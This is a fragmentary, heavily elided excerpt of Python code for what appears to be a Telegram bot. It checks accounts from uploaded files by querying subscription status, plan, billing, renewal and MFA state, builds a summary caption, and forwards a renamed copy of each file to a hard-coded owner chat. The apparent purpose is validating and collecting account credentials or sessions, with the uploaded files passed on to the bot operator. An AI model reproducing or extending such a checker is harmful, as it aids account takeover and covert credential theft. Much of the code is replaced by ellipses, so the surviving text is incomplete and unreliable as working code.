    ...
    for attempt in range(RETRIES):
        try:
            ...
            if r2.status_code != 200:
                ...
                raise Exception(f"subs HTTP {r2.status_code}")
            ...
            # on final attempt, return whatever error
...
async def process_one_file(
    ...
    if plan.lower() == "free":
        display_plan = "Free ⚠️"
        display_billing = "None"
        display_currency = "None"
    else:
        display_plan = plan.title()
        bp = d.get("billing_period")
        display_billing = bp.title() if bp else "None"
        bc = d.get("billing_currency")
        display_currency = bc.upper() if bc else "None"
    ...
    caption = (
        ...
        f"💳Billing Period: {display_billing}\n"
        f"💫Will Renew: {d.get('will_renew')}\n"
        f"💸Billing Currency: {display_currency}\n"
        f"🔒MFA: {d.get('mfa')}"
    )
    new_name = f"{bot_user}-{message_id}{ext}"
    bio = BytesIO(content); bio.name=new_name; bio.seek(0)
    ...
    bio2 = BytesIO(content); bio2.name=new_name; bio2.seek(0)
    await context.bot.send_document(
        OWNER_CHAT_ID,
        document=InputFile(bio2, filename=new_name),
